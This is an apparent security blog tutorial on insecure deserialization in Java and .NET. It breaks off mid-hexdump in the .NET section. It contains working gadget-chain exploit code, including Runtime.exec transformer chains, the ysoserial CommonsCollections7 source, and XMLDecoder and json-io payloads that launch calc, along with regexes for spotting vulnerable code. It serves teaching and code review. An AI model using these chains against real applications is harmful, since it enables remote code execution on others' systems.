# Serialization: the big threat

One of the emerging security issues affecting Object Oriented Programming (OOP) Languages over the last few years was "Insecure Deserialization". A wide range of literature is already available on this topic, however, the main objective of this document is to provide a brief and precise explanation of this vulnerability, as well as common exploitation and detection methods. Moreover, we will see how this method can be applied to different programming languages.

## Table of Contents

1. Serialization: What is it?
2. Deserialization: What do I need to know?
    1. JAVA
        + Binary serialization archive
        + Generate payloads dinamically: ysoserial
        + Text-based serialization archive
            * XML
            * JSON
        + Generate payloads dinamically: marshalsec
        + Tips for source code reviewers
    2. .NET
        + Binary serialization archive
        + Generate payloads dinamically: ysoserial.net
        + Text-based serialization archive
            * XML
            * JSON
        + Tips for source code reviewers
    3. PHP
        + Native serialization archive
            * Differences from JAVA and .NET
            * How to search for valid gadgets
            * PHAR Driven Deserialization
        + Generate payloads dinamically: PHPGGC
        + Tips for source code reviewers
    4. Python
        + Binary serialization archive
        + Text-based serialization archive
            * YAML
            * JSON
        + Generate payloads dinamically: deser-py
        + Tips for source code reviewers
    5. NodeJS
        + Text-based serialization archive
        + Generate payloads dinamically: deser-node
    6. Ruby
        + Binary serialization archive
        + Text-based serialization archive
            * YAML
        + Generate payloads dinamically: deser-ruby
        + Tips for source code reviewers
3. References

## Serialization: What is it?
 
Object serialization, also known as "marshalling", is the process of converting an object-state, in the form of an arbitrarily complicated data structure, in a way  that can be easily sent in message, stored in a database, or saved in a text file (this is commonly achieved with a serialized string). The serialized object-state could then be reconstructed using the opposite process, called deserialization, or "unmarshalling", which produce an object that is "semantically" identical to the original.

![Serialization](https://raw.githubusercontent.com/klezVirus/klezVirus.github.io/master/images/Serialization%20Diagram.png)

By looking solely at the definition, this seems to be an easy process; in reality it is quite the opposite. Serialization is a low-level technique that violates encapsulation and breaks the opacity of an abstract data type.
In many programming languages serialization is natively supported (usually within core libraries) and, as such, no additional code development is required.

The languages that support serialisation and that are of interest for this document are:

* Java
* .NET
* PHP
* Python
* NodeJS
* Ruby

At the time of writing, no other language has been found to be affected by this issue.

The result of the serialization process is called "archive", or sometimes archive medium. Serialization archive formats fall into three main categories: 

* Text-based - as a stream of text characters. Typical examples of text-based formats include raw text format, JavaScript Object Notation (JSON) and Extensible Markup Language (XML).
* Binary - as a stream of bytes. Binary formats are more implementation-dependent and are not so standardized.
* "Hybrid" or native, like PHP serialization, Python pickle and others. Hybrid format is usually in the middle between the two previous formats, and can be totally or partially human readable.

Following, a few examples of serialization (JAVA):

![Serialization Example](https://github.com/klezVirus/klezVirus.github.io/raw/master/images/serialization%20examples.png)

## Deserialization: What I need to know?

The first things to know about deserialization is that it does not make source-code vulnerable by just using it. As in many other examples found in code development, applications can be implemented securely. This concept led to the definition of "Insecure Deserialization", and it is actually a combination of factors which altogether allow the exploitation of the deserialization process.

The main idea behind insecure deserialization is that, under certain conditions, a user can force the application to load an arbitrary class object during the unmarshalling process. Depending on the content of the forced class, different outputs can be achieved: Denial-of-Service (DoS) and Remote Code Execution (RCE) are among the most interesting ones.

But what are these conditions? The conditions needed to exploit the deserialization process may vary depending on language and platform involved.

It is important to define at this point is the concept of **POP Gadget**. Informally, a gadget is a piece of code (i.e property or method), implemented by an application's class, that can be called during the deserialization process. These gadgets can be further combined/chained to call additional classes, or execute other code. Informally, a set of gadget may be more than enough to call an arbitrary function provided by the language, in which case, it is possible for an attacker to achieve RCE on the target application, using a POP chain.

*If the reader is familiar with advanced binary exploitation, the concept is very similar to ROP gadgets, while POP (Property Oriented Programming) is used instead of ROP (Return Oriented Programming).*

To give a more precise definition, POP gadgets are classes or piece of classes with the following characteristics:

* Can be serialized
* Has public/accessible properties (class variables, we'll see later on)
* Implements specific vulnerable methods [Language dependent]
* **[Visibility constraint]** Has access to other "callable" classes

**Note:** The term "visibility constraint", is referring to capability of a POP gadget to be accessed by the application during the deserialization process. If the application had no visibility over the class used for the exploitation (module not loaded, version mismatch, sandboxing, altered standard library, etc.), the POP chain would fail to execute.

Before proceeding further, it is necessary to define the generic structure of a deserialization exploit:

1. Find an application endpoint that deserializes user controllable data
2. Find a **Gadget** for exploitation
3. Develop a serializer to build the payload (Ready-to-use tools are available)
4. Use the payload against the endpoint

**Notes about code samples:** 

* All the samples of this document were tested on a Windows box.
* All the code of this document can be found in the main GitHub repository, [here](https://github.com/klezVirus/klezVirus.github.io/tree/master/The_Big_Problem_of_Serialisation).

### Java

The following chapter will focus on JAVA based deserialization issues, and will be divided by serialized archive format.

#### Java: Binary Archive Format

In JAVA, objects can be serialiazed only if their class implements the `java.io.Serializable` interface. 
The most common method used to serialize objects is using ByteStreams. A simple example is provided below:

```java
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class Desert implements Serializable{

    private static final long serialVersionUID = 1L;
    public String name;
    public int width;
    public int height;

    public Desert(String name, int i, int j) {
        // Constructor
        this.name = name;
        this.width = i;
        this.height = j;
    }

    public static void Deserialize() {
        try{
            //Creating an input stream to reconstruct the object from serialised data
            ObjectInputStream in=new ObjectInputStream(new FileInputStream("de.ser"));
            Desert desert=(Desert)in.readObject();
            // Showing the data of the serialised object
            System.out.println("The desert: " + desert.name);
            System.out.println("Has a surface of: " + String.valueOf(desert.width*desert.height) );
            // Closing the stream
            in.close();
            }catch(Exception e){
                System.out.println(e);
                }
            }

    public static void Serialize() {
        try {
            // Creating the object
            Desert desert = new Desert("Mobi", 2000, 1500);
            // Creating output stream and writing the serialised object
            FileOutputStream outfile = new FileOutputStream("de.ser");
            ObjectOutputStream outstream = new ObjectOutputStream(outfile);
            outstream.writeObject(desert);
            outstream.flush();
            // closing the stream
            outstream.close();
            System.out.println("Serialized data saved to de.ser");
        } catch (Exception e) {
            System.out.println(e);
        }
    }
    
    public static void main(String args[]) {
        boolean serialize = true;
        
        if (serialize) {
            Desert.Serialize();
        } else {
            Desert.Deserialize();
        }
    }
}
```

Once executed, it would give us the following file:

```
$ hexdump.exe -C de.ser
00000000  ac ed 00 05 73 72 00 06  44 65 73 65 72 74 31 91  |....sr..Desert1.|
00000010  71 33 04 c2 c7 18 02 00  03 49 00 06 68 65 69 67  |q3.......I..heig|
00000020  68 74 49 00 05 77 69 64  74 68 4c 00 04 6e 61 6d  |htI..widthL..nam|
00000030  65 74 00 12 4c 6a 61 76  61 2f 6c 61 6e 67 2f 53  |et..Ljava/lang/S|
00000040  74 72 69 6e 67 3b 78 70  00 00 05 dc 00 00 07 d0  |tring;xp........|
00000050  74 00 04 4d 6f 62 69                              |t..Mobi|
00000057
```

The starting bytes, `ac ed 00 05` are a known signature for JAVA serialized objects. It should be noticed that the `Deserialize` function, calls one of the potentially exploitable function of JAVA, `readObject()`. During the deserialization process (via the `readObject()` function), the serialized-object properties are accessed recursively, untill every properties have been read. This process is due to the nature of serialization, as an exact clone of the original object is the result of this process, each and every property must be read and re-instantiated. 

How can this process be exploited? Basically, by passing an arbitrary nested object to the `readObject()` function, forcing the application to instantiate a chain of POP gadgets that will lead to an RCE. The POP gadgets that can be used may vary depending on the application `CLASSPATH` (as any gadget function must be on the classpath in order to be instantiated [Visibility Constraint]). 
The POP chain uses an opaque class order in order to chain subsequent classes using reflection, which allows to dynamically load classes and methods even without prior knowledge of these classes and methods. A common pattern used to create chains is the DynamicProxy pattern, which more details can be found [here](https://docs.oracle.com/javase/8/docs/technotes/guides/reflection/proxy.html).

Following, a very basic example of DynamicProxy implementation:

```java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.Map;

public class DynamicProxy implements InvocationHandler {
          
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) 
      throws Throwable {
        System.out.println("Invoked method: " + method.getName());
        return method.getName();
    }

    public static void main(String args[]) {
        Map proxyInstance = (Map) Proxy.newProxyInstance(
        DynamicProxy.class.getClassLoader(), 
        new Class[] { Map.class }, 
        new DynamicProxy());
        
        System.out.println(proxyInstance.toString());
    }   
}
```

The above, would produce the following output:

```
Invoked method: toString
toString
```

Showing that any code contained in the `invoke` function gets executed when a method of the proxy is called. Using this approach, it is possible to force the execution of arbitrary code whenever a specific method is invoked.

*It should be noted that the use of `map`, is arbitrary, whatever object class could be used on its place.*

Another useful pattern (technically more a class than a pattern), which is crucial to understand how it is possible to trigger remote code execution during deserialization, is the `ChainedTransformer` class.

A transformer, in JAVA, is a class which takes an object and returns a new object instance. A chained transformer, for instance, can chain multiple transformer togheter to transform an object multiple times, in sequence. To understand how this can be used to reach RCE, the following code may be taken as example:

```java
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class ExeCmdInvokerTransformer {
    
    public static void main(String args[]) {
        
        final String[] execArgs = new String[]{"cmd /c calc"};
        
        // Chain to transform object in -> ((Runtime)Runtime.class.getMethod("getRuntime").invoke(Object.class, null)).exec("cmd /c calc");
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec",
                new Class[]{String.class}, 
                execArgs
                 ),
            new ConstantTransformer(1)};
        
        Transformer transformerChain = new ChainedTransformer(transformers);
        
        // Testing the transformer
        Object object = new Object();
        transformerChain.transform(object);
    }
}
```

Above, the chain transformer takes an arbitrary object, ignores it, calls runtime `exec`, and executes an arbitrary command (in this case `cmd /c calc`).

The last "pattern" that is important to see is the "key creation via LazyMap key search miss". A LazyMap, in JAVA, is a decorator (function that can be applied to an object, a Map in this case) that gets executed whenever a key is requested in a Map, invoking a transformer. The terms "lazy", refers to the fact that a map decorated with a LazyMap decorator isn't filled by (key, value) pairs from the start, but it gets populated once the first call to a map key forces the transformer to execute, fetching the correct value for the requested key. The following example may help to understand how the proces works:

```java
import java.util.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.map.LazyMap;

public class HowLazyMap {
    
    public static void main(String args[]) {
    // Create a Transformer to get random areas
        Transformer randomArea = new Transformer( ) {
            public Object transform( Object object ) {
                String name = (String) object;
                Random random = new Random();
                return random.nextDouble();
            }
        };

        // Create a LazyMap called desertAreasLazy, which uses the above Transformer
        Map deserts = new HashMap( );
        Map desertAreasLazy = LazyMap.decorate( deserts, randomArea );
        
        // Set name to fetch
        String desertName = "Gobi";
        
        System.out.println(String.format("Deserts contains %s? Result: %s", desertName, deserts.get(desertName)));  
        
        // Get name, print area
        String area = (String) String.valueOf(desertAreasLazy.get( desertName ));
        System.out.println( "Area: " + area );

        System.out.println(String.format("Deserts now contains %s? Result: %s", desertName, deserts.get(desertName)));
    }
}
```

The result would be something like:

```
Deserts contains Gobi? Result: null
Area: 0.8610944732469801
Deserts now contains Gobi? Result: 0.8610944732469801
```

Showing that the LazyMap populates the HashMap with a "lazy" approach.

How can the above be chained to exploit the deserialization process?

Informally, a gadget chain could be built to create a LazyMap, set a Dynamic Proxy to hook a key creation, and execute a chained transformer on the hook. A more detailed example, using CommonsCollection, is provided further on. 

#### Generate payloads dynamically: Ysoserial

During the years, a set of common libraries were identified that can be used to build POP chains. These libraries are known as **gadget libraries**.

These common libraries can be automatically used to generate exploit payloads, using a very powerful tool named **ysoserial**, available [here](https://github.com/frohoff/ysoserial).

The available payloads are listed below:
```
     Payload             Authors                                Dependencies
     -------             -------                                ------------
     BeanShell1          @pwntester, @cschneider4711            bsh:2.0b5
     C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
     Clojure             @JackOfMostTrades                      clojure:1.8.0
     CommonsBeanutils1   @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
     CommonsCollections1 @frohoff                               commons-collections:3.1
     CommonsCollections2 @frohoff                               commons-collections4:4.0
     CommonsCollections3 @frohoff                               commons-collections:3.1
     CommonsCollections4 @frohoff                               commons-collections4:4.0
     CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1
     CommonsCollections6 @matthias_kaiser                       commons-collections:3.1
     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
     FileUpload1         @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
     Groovy1             @frohoff                               groovy:2.3.9
     Hibernate1          @mbechler
     Hibernate2          @mbechler
     JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     JRMPClient          @mbechler
     JRMPListener        @mbechler
     JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     JavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
     Jdk7u21             @frohoff
     Jython1             @pwntester, @cschneider4711            jython-standalone:2.5.2
     MozillaRhino1       @matthias_kaiser                       js:1.7R2
     MozillaRhino2       @_tint0                                js:1.7R2
     Myfaces1            @mbechler
     Myfaces2            @mbechler
     ROME                @mbechler                              rome:1.0
     Spring1             @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
     Spring2             @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
     URLDNS              @gebl
     Vaadin1             @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
     Wicket1             @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
```

Taking the deserialization example provided above, the reader may try to craft a payload using ysoserial and CommonsCollections7:

```bash
$ ysoserial CommonsCollections7 "cmd /c calc.exe" > ./Serialize/de.ser
```

However, if used against the example, the payload won't work, showing a `java.lang.ClassNotFoundException: org.apache.commons.collections.map.LazyMap` exception. The reason being the "visibility constraint". The payload *CommonsCollection7* uses `CommonsCollections:3.1`, which is not part of the standard JAVA SDK, which means the POP gadgets to build the required chain cannot be found. In order to make it work, the reader should ensure to add this dependency to the application classpath. A working example, where the `org.apache.commons-collections:3.1` dependency has been added, can be found [here](https://github.com/klezVirus/klezVirus.github.io/tree/master/The_Big_Problem_of_Serialisation/java/Serialize). 

Payloads generated with ysoserial share a common structure, which use a Payload Runner using maps to setup the conditions, and a transformer to actually build and run OS commands. 

Following the implementation of CommonsCollections7:

```java
public class CommonsCollections7 extends PayloadRunner implements ObjectPayload<Hashtable> {

    public Hashtable getObject(final String command) throws Exception {

        // Reusing transformer chain and LazyMap gadgets from previous payloads
        final String[] execArgs = new String[]{command};

        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        final Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec",
                new Class[]{String.class},
                execArgs),
            new ConstantTransformer(1)};

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);

        // Use the colliding Maps as keys in Hashtable
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        // Needed to ensure hash collision after previous manipulations
        lazyMap2.remove("yy");

        return hashtable;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections7.class, args);
    }
}
```
Dissecting the above code:

1. Using `readObject()`, the JVM looks for the serialized Object's class in the ClassPath. 
    + Class not found -> throws  exception(ClassNotFoundException)
    + Class found ->  java.util.Hashmap.reconsitutionPut is called 
3. The code forced a hash collision, so a comparison is issued using `equals`
4. The decorator forwards the method to the AbstractMap -> lazyMap
5. The lazyMap attempts to retrieve a value with a key equal to the "map"
6. Since that key does not exist, the lazyMap instance goes ahead and tries to create a new key
7. Since a chainedTransformer is set to execute during the key creation process, the chained transformer with the malicious payload is invoked, leading to remote code execution.

#### Java: Text-based Archive Format

Of course, this issue doesn't affect just the binary archive format, but can be extended to text-based serialization archives. The two formats that are of interest for this document are XML and JSON.

**XML**

XML Serialization/Deserialization is offered, among others, by the XMLEncoder/XMLDecoder and XStream classes. These classes are known to be susceptible to deserialization issues leading to RCE.

Let's consider the following example:

```java
import java.beans.XMLDecoder;
import java.io.BufferedInputStream;
import java.io.FileInputStream;
 
public class DesertXML {
     
    public static void main(String[] args) throws Exception {
         
        XMLDecoder decoder = new XMLDecoder(new BufferedInputStream(new FileInputStream("desert.xml")));
 
        // Deserialise object from XML
        Object desert = decoder.readObject();
        decoder.close();
         
        System.out.println("The desert: " + ((Desert)desert).getName());
        System.out.println("Has a surface of: " + String.valueOf(((Desert)desert).getWidth()*((Desert)desert).getHeight()) );
 
    }
     
    public static class  Desert {
         
        private String name;
        private int width;
        private int height;

        /**
         * Getters and Setters
         */
        public String getName() {
            return name;
        }
        public void setName(String name) {
            this.name = name;
        }
        public int getWidth() {
            return width;
        }
        public void setWidth(int width) {
            this.width = width;
        }
        public int getHeight() {
            return height;
        }
        public void setHeight(int height) {
            this.height = height;
        }    
    }
}
```

The application tries to instantiate a Desert object by loading it from an external XML file. Instead of an XML parser, the `readObject()` is called from the `XMLDecoder` class.

As for the previous example, it is possible to force the application into loading arbitrary classes, in the most suitable way to execute arbitrary code. 
In this case, it would be possible to load classes used by JAVA to interact with the OS, such as `java.lang.Runtime` or `java.lang.ProcessBuilder`. By using these classes, the application would kindly start new processes, executing arbitrary code. An example payload is provided below:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.8.0_241" class="java.beans.XMLDecoder">
 <void class="java.lang.ProcessBuilder">
   <array class="java.lang.String" length="3">
          <void index="0">
              <string>cmd</string>
          </void>
          <void index="1">
              <string>/c</string>
          </void>
          <void index="2">
              <string>calc</string>
          </void>
      </array>
    <void method="start" id="process">
    </void>
  </void>
</java>
```

**JSON**

Of course, JSON format is not free from this kind of vulnerability. The main problem with JSON, however, is that different libraries exist in JAVA which supports automatic serialization/deserialization, and not all of them are equally subsceptible to this kind of attack. The library chosen as subject of the following example is JsonIO (json-io).

The following code would serve as a proof-of-concept of a vulnerable JSON deserializer:

```java
public class DesertJSON {
     
    public static void main(String[] args) throws Exception {

        // Read JSON as a string
        String json = new String(Files.readAllBytes(Paths.get("desert.json")));
        // Deserialising        
        Object desert = JsonReader.jsonToJava(json);

        System.out.println("The desert: " + ((Desert)desert).getName());
        System.out.println("Has a surface of: " + String.valueOf(((Desert)desert).getWidth()*((Desert)desert).getHeight()) );
    }
     
    public static class  Desert {
         
        private String name;
        private int width;
        private int height;
        
        /**
         * Getters and Setters
         */
        public String getName() {
            return name;
        }
        public void setName(String name) {
            this.name = name;
        }
        public int getWidth() {
            return width;
        }
        public void setWidth(int width) {
            this.width = width;
        }
        public int getHeight() {
            return height;
        }
        public void setHeight(int height) {
            this.height = height;
        }    
    }
}
```
The main weakness of JsonIO (json-io) is that it allows to specify the type of the object to be deserialized within the JSON body, using the `@type` key. If the type is not validated, it is possible to force the application to load an arbitrary class. The concept used for exploitation is the same as the other type of deserialization issues, the only thing needed is to find a POP chain to achieve RCE. 

#### Generate payloads dinamically: marshalsec

In [this](https://github.com/no-sec-marko/marshalsec/blob/master/marshalsec.pdf) research, M. Becheler, enumerates various JSON libraries and each method used for RCE exploitation. As part of the research, he provided an interesting tool, to automatically generates payloads for these libraries. For example, considering the vulnerable deserializaer, it is possible to generate the following payload:

```bash
$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"

{"@type":"java.util.Arrays$ArrayList","@items":[{"@id":2,"@type":"groovy.util.Expando","expandoProperties":{"@type":"java.util.HashMap","hashCode":{"@type":"org.codehaus.groovy.runtime.MethodClosure","method":"start","delegate":{"@id":1,"@type":"java.lang.ProcessBuilder","command":{"@type":"java.util.ArrayList","@items":["cmd","/c","calc"]},"directory":null,"environment":null,"redirectErrorStream":false,"redirects":null},"owner":{"@ref":1},"thisObject":null,"resolveStrategy":0,"directive":0,"parameterTypes":[],"maximumNumberOfParameters":0,"bcw":null}}},{"@type":"java.util.HashMap","@keys":[{"@ref":2},{"@ref":2}],"@items":[{"@ref":2},{"@ref":2}]}]}
```

If opened with the vulnerable deserializer, a calculator will spawn on the hosting machine.

#### Tips for Source Code reviewers

To find this kind of vulnerability it is usually enough to search the code for common regexes, like: 

* `.*readObject\(.*`
* `java.beans.XMLDecoder`
* `com.thoughtworks.xstream.XStream`
* `.*\.fromXML\(.*\)`
* `com.esotericsoftware.kryo.io.Input`
* `.readClassAndObject\(.*`
* `.readObjectOrNull\(.*`
* `com.caucho.hessian.io`
* `com.caucho.burlap.io.BurlapInput`
* `com.caucho.burlap.io.BurlapOutput`
* `org.codehaus.castor`
* `Unmarshaller`
* `jsonToJava\(.*`
* `JsonObjectsToJava\/.*`
* `JsonReader`
* `ObjectMapper\(`
* `enableDefaultTyping\(\s*\)`
* `@JsonTypeInfo\(`
* `readValue\(.*\,\s*Object\.class`
* `com.alibaba.fastjson.JSON`
* `JSON.parseObject`
* `com.owlike.genson.Genson`
* `useRuntimeType`
* `genson.deserialize`
* `org.red5.io`
* `deserialize\(.*\,\s*Object\.class`
* `\.Yaml`
* `\.load\(.*`
* `\.loadType\(.*\,\s*Object\.class`
* `YamlReader`
* `com.esotericsoftware.yamlbeans`

For each match, the code should be manually inspected to see whether the object being deserialized can be manipulated by an external attacker.

**Additional Affected Libraries**

As previously said, through the years, many other libraries had been found to be affected by this vulnerability. While exploring all of them is outside the bounds of this article, following a list of additional resource, which can be used by the hungry reader to further explore this fascinating issue:

* [Kryo](https://www.contrastsecurity.com/security-influencers/serialization-must-die-act-1-kryo-serialization)
* [XStream](http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/)
* [AMF](http://codewhitesec.blogspot.ru/2017/04/amf.html)
* [YAML and Other](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf)

For additional references and a safe playground to exercise with this kind of vulnerabilities, a dear friend and colleague **Nicky Bloor** developed a fantastic vulnerable Lab, called [DeserLab](https://github.com/NickstaDB/DeserLab).

If that was not enough, he released a set of fantastic tools to aid with Java deserialization identification and exploitation:

* [SerializationDumper](https://github.com/NickstaDB/SerializationDumper)
* [SerialBrute](https://github.com/NickstaDB/SerialBrute)
* [BaRMIe](https://github.com/NickstaDB/BaRMIe)

Nicky is an expert code reviewer and one of the major experts about JAVA deserialization issues, you can find out more about his work [here](https://www.cognitous.co.uk/).

---

### .NET

.NET, as JAVA, has developed over the years different mechanism to support object serialization. As Java, the primary archive formats are:

* Binary
* XML
* JSON

#### .NET: Binary Archive Format

In .NET, Binary serialization is mainly provided by `System.Runtime.Serialization.Binary.BinaryFormatter`. This class can virtually serialize ANY type which is marked as [Serializable] or which directly implements the ISerializable interface (allowing custom serialization).

The following C# code can be used to serialize/deserialize the class Desert (similarly to the JAVA examples):

```csharp
using System;
using System.IO;
using System.Runtime.Serialization;
using
System.Runtime.Serialization.Formatters.Binary;
namespace BinarySerialization
{
    public static class BinarySerialization
    {
        private const string filename = "desert.ser";
        [STAThread]
        static void Main(string[] args)
        {
            Console.WriteLine();

            bool deserialize = false;
            if (deserialize)
            {
                BinarySerialization.desertDeserial(filename);
            }
            else
            {
                // Delete old file, if it exists
                BinarySerialization.deleteFile(filename);
                BinarySerialization.desertSerial(filename);
            }
            Console.WriteLine();
            Console.WriteLine("Press Enter Key");
            Console.Read();
        }

        public static void deleteFile(string filname)
        {
            if (File.Exists(filename))
            {
                Console.WriteLine("Deleting old file");
                File.Delete(filename);
            }
        }

        public static void desertDeserial(string filename)
        {
            var formatter = new BinaryFormatter();
            // Open stream for reading
            FileStream stream = File.OpenRead(filename);
            Console.WriteLine("Deserializing string");
            // Deserializing
            var desert = (Desert)formatter.Deserialize(stream);
            stream.Close();
        }

        public static void desertSerial(string filename)
        {
            // Create desert name
            var desert = new Desert();
            desert.name = "Gobi";
            // Persist to file
            FileStream stream = File.Create(filename);
            var formatter = new BinaryFormatter();
            Console.WriteLine("Serializing desert");
            formatter.Serialize(stream, desert);
            stream.Close();
        }
    }

    [Serializable]
    public class RCE : IDeserializationCallback
    {
        private String _cmd;
        public String cmd
        {
            get { return _cmd; }
            set
            {
                _cmd = value;
                run();
            }
        }

        private void run()
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = _cmd;
            p.Start();
            p.Dispose();
        }

        public void OnDeserialization(object sender) {
            Run();
        }
    }

    [Serializable]
    public class Desert
    {
        private String _name;

        public String name
        {
            get { return _name; }
            set { _name = value; Console.WriteLine("Desert name: " + _name); }
        }
    }
}
```

Running the serializer, the following object would be created:

```
$ hexdump.exe -C desert.ser
00000000  00 01 00 00 00 ff ff ff  ff 01 00 00 00 00 00 00  |................|
00000010  00 0c 02 00 00 00 49 42  61 73 69 63 58 4d 4c 53  |......IBasicXMLS|
00000020  65 72 69 61 6c 69 7a 65  72 2c 20 56 65 72 73 69  |erializer, Versi|
00000030  6f 6e 3d 31 2e 30 2e 30  2e 30 2c 20 43 75 6c 74  |on=1.0.0.0, Cult|
00000040  75 72 65 3d 6e 65 75 74  72 61 6c 2c 20 50 75 62  |ure=neutral, Pub|
00000050  6c 69 63 4b 65 79 54 6f  6b 65 6e 3d 6e 75 6c 6c  |licKeyToken=null|
00000060  05 01 00 00 00 1a 42 69  6e 61 72 79 53 65 72 69  |......BinarySeri|
00000070  61 6c 69 7a 61 74 69 6f  6e 2e 44 65 73 65 72 74  |alization.Desert|
00000080  01 00 00 00 05 5f 6e 61  6d 65 01 02 00 00 00 06  |....._name......|
00000090  03 00 00 00 04 47 6f 62  69 0b                    |.....Gobi.|
0000009a
```

The first 17 bytes are the header of the serialized object, which consists of:

* RecordTypeEnum (1 byte)
* RootId (4 bytes)
* HeaderId (4 bytes)
* MajorVersion (4 bytes)
* MinorVersion (4 bytes)

How can it be exploited?

The approach is very similar to the one applied to JAVA, and consists to trick the application into loading an arbitrary object, that could allow to gain code execution capabilities. In order to do it, a suitable class or chain of classes must be found, which should have at least the following properties (NW: not a formal definition):

* Serializable
* Holding public/settable variables
* Implementing magic "functions" (we'll see an example below), like:
    - Get/Set
    - OnSerialisation
    - Constructors/Destructors

Taking a deeper look at the code above, it is possible to see this class:

```csharp
 [Serializable]
public class RCE : IDeserializationCallback
{
    private String _cmd;
    public String cmd
    {
        get { return _cmd; }
        set
        {
            _cmd = value;
            Run();
        }
    }

    public void Run()
    {
        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo.FileName = _cmd;
        p.Start();
        p.Dispose();
    }

    public void OnDeserialization(object sender) {
        Run();
    }
}
```

This class seems to fulfill the requirements for a **Gadget**, and could be even used alone to execute arbitrary code. In order to achieve it, it would be enough to serialize the RCE class giving a valid command to execute: 

```csharp
using System;
using System.IO;
using System.Runtime.Serialization;
using
System.Runtime.Serialization.Formatters.Binary;
namespace BinarySerialization
{
    public static class BinarySerialization
    {
        private const string filename = "desert.ser";
        [STAThread]
        static void Main(string[] args)
        {
            Console.WriteLine();
            // Delete old file, if it exists
            BinarySerialization.deleteFile(filename);
            // Serialize RCE
            BinarySerialization.desertSerial(filename);
            // Wait for Enter
            Console.WriteLine();
            Console.WriteLine("Press Enter Key");
            Console.Read();
        }

        public static void deleteFile(string filname)
        {
            if (File.Exists(filename))
            {
                Console.WriteLine("Deleting old file");
                File.Delete(filename);
            }
        }     

        public static void desertSerial(string filename)
        {
            // Create desert name
            var desert = new RCE();
            desert.cmd = "calc.exe";
            // Persist to file
            FileStream stream = File.Create(filename);
            var formatter = new BinaryFormatter();
            Console.WriteLine("Serializing desert (RCE)");
            formatter.Serialize(stream, desert);
            stream.Close();
        }

    }

    [Serializable]
    public class RCE : IDeserializationCallback
    {
        private String _cmd;
        public String cmd
        {
            get { return _cmd; }
            set
            {
                _cmd = value;
                //run(); Disabled to avoid spawning a calc while serializing 
            }
        }

        private void run()
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = _cmd;
            p.Start();
            p.Dispose();
        }

        public void OnDeserialization(object sender) {
            Run();
        }
    }
}
```

Serializing that would produce the following file:

```
$ hexdump.exe -C desert.ser
00000000  00 01 00 00 00 ff ff ff  ff 01 00 00 00 00 00 00  |................|
00000010  00 0c 02 00 00 00 47 42  69 6e 61 72 79 53 65 72  |......GBinarySer|
00000020  69 6c 69 61 7a 65 72 2c  20 56 65 72 73 69 6f 6e  |iliazer, Version|
00000030  3d 30 2e 30 2e 30 2e 30  2c 20 43 75 6c 74 75 72  |=0.0.0.0, Cultur|
00000040  65 3d 6e 65 75 74 72 61  6c 2c 20 50 75 62 6c 69  |e=neutral, Publi|
00000050  63 4b 65 79 54 6f 6b 65  6e 3d 6e 75 6c 6c 05 01  |cKeyToken=null..|
